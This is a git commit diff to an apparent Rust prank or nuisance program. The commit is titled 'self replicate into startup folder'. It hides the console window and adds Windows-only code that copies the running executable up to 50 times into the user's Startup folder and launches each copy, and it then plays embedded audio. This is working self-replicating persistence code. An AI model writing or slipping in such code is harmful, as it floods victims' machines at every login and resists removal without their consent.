4fce1269819f9dad9557d9b2e7d6373ac328f6d7
Mr. Cetto <contact@phoenixthrush.com>
2025-12-28 00:57:19 +0100

    self replicate into startup folder

--- src/main.rs
+++ src/main.rs
@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+#![cfg_attr(windows, windows_subsystem = "windows")]
 
 use rust_embed::RustEmbed;
 use std::error::Error;
@@ -8,6 +8,35 @@ use std::error::Error;
 struct Assets;
 
 fn main() -> Result<(), Box<dyn Error>> {
+    #[cfg(windows)]
+    {
+        use dirs;
+        use std::path::PathBuf;
+
+        let exe_path = std::env::current_exe()?;
+        let startup_dir: PathBuf = dirs::home_dir()
+            .ok_or("Could not find home directory")?
+            .join("AppData")
+            .join("Roaming")
+            .join("Microsoft")
+            .join("Windows")
+            .join("Start Menu")
+            .join("Programs")
+            .join("Startup");
+
+        for i in 1..=50 {
+            let target_path = startup_dir.join(format!(
+                "{}_{}.exe",
+                exe_path.file_stem().unwrap().to_string_lossy(),
+                i
+            ));
+            if !target_path.exists() {
+                std::fs::copy(&exe_path, &target_path)?;
+                std::process::Command::new(&target_path).spawn()?;
+            }
+        }
+    }
+
     let stream_handle = rodio::OutputStreamBuilder::open_default_stream()?;
     let sink = rodio::Sink::connect_new(stream_handle.mixer());
 
